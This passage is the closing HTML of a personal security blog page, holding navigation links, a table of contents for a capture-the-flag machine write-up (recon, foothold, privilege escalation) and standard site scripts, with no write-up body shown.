<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/THM/RootMe/">← Next [THM] RootMe</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/HTB/Visual/">[HTB] Visual Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'foguh' Ferreira</a></h1><div id="description"><p>SOC Analyst</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Page"><span class="toc-number">1.2.</span> <span class="toc-text">HTTP Page</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gobuster"><span class="toc-number">1.3.</span> <span class="toc-text">Gobuster</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-number">1.4.</span> <span class="toc-text">SMB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FootHold"><span class="toc-number">2.</span> <span class="toc-text">FootHold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CrackMapExec"><span class="toc-number">2.1.</span> <span class="toc-text">CrackMapExec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL"><span class="toc-number">2.2.</span> <span class="toc-text">SQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Login"><span class="toc-number">2.3.</span> <span class="toc-text">User Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Flag"><span class="toc-number">2.4.</span> <span class="toc-text">User Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">3.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Privileges-Certificates"><span class="toc-number">3.1.</span> <span class="toc-text">Privileges&#x2F;Certificates</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">3.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Root-Flag"><span class="toc-number">3.3.</span> <span class="toc-text">Root Flag</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>